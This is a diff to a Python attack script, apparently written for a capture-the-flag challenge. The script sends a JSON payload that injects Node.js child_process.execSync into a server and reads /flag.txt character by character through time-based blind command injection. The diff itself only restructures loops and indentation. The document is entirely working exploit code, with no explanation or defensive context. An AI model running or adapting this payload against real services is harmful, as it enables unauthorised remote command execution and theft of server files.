@@ -19,20 +19,22 @@ def blind_cmd_injection():
     for num in range(1,30):
         if count > 100:            
             break
-        for char in charlist:                  
-            data=f'''{{
-    "text": "' + require('child_process').execSync('cat /flag.txt | head -c {num} | tail -c {num} | {{ read c; if [ \\"$c\\" = \\"{foundchar}{char}\\" ]; then sleep 2; fi; }}')+ `'`, statusCode: 403}})//"
-    }}'''
-            
-            response=requests.post(url=url, proxies=proxies, headers=headers, data=data)
+        else:            
+            for char in charlist:                  
+                data=f'''{{
+        "text": "' + require('child_process').execSync('cat /flag.txt | head -c {num} | tail -c {num} | {{ read c; if [ \\"$c\\" = \\"{foundchar}{char}\\" ]; then sleep 2; fi; }}')+ `'`, statusCode: 403}})//"
+        }}'''
+                
+                response=requests.post(url=url, proxies=proxies, headers=headers, data=data)
 
-            if response.elapsed.total_seconds() > 2:            
-                foundchar+=char
-                print(foundchar) 
-                count= 0
-                break
-            else:
-                count+=1
+                if response.elapsed.total_seconds() > 2:            
+                    foundchar+=char
+                    print(foundchar) 
+                    count= 0
+                    break
+                else:
+                    count+=1
+                    #print(count)
     
 try:
     blind_cmd_injection()
